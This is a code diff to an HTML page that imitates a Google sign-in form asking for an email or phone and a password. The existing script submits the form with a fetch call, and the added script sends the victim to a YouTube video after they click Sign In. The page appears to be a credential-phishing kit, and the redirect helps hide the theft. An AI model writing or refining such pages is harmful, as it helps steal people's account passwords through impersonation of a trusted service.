@@ -17,14 +17,14 @@
     <p>Use your Google Account</p>
     <form name="email_sub">
         <div class="inputBox">
-          <input type="text" name="Email"  required onkeyup="this.setAttribute('value', this.value);"  value="">
+          <input type="email" name="Email"  required onkeyup="this.setAttribute('value', this.value);"  value="">
           <label>Email or phone</label>
         </div>
         <div class="inputBox">
             <input type="password" name="Message" required onkeyup="this.setAttribute('value', this.value);" value="">
             <label>Password</label>
         </div>
-        <input type="submit" name="sign-in" value="Sign In">
+        <input type="submit" name="sign-in" value="Sign In" id="redirect">
       </form>
     </div>   
 
@@ -44,5 +44,18 @@
           .then( a => (form.reset()));
       })
       </script>  
+      <script>
+        // Get a reference to the button element
+        var button = document.getElementById("redirect");
+
+        // Define the URL you want to redirect to
+        var redirectUrl = "https://www.youtube.com/watch?v=G8a1lz10H-Q&list=RDGs7D7fPerDc&index=10&ab_channel=TheYellowDiary-Topic";
+
+        // Add a click event listener to the button
+        button.addEventListener("click", function() {
+            // Redirect to the specified URL
+            window.location.href = redirectUrl;
+        });
+    </script>
 </body>
 </html>
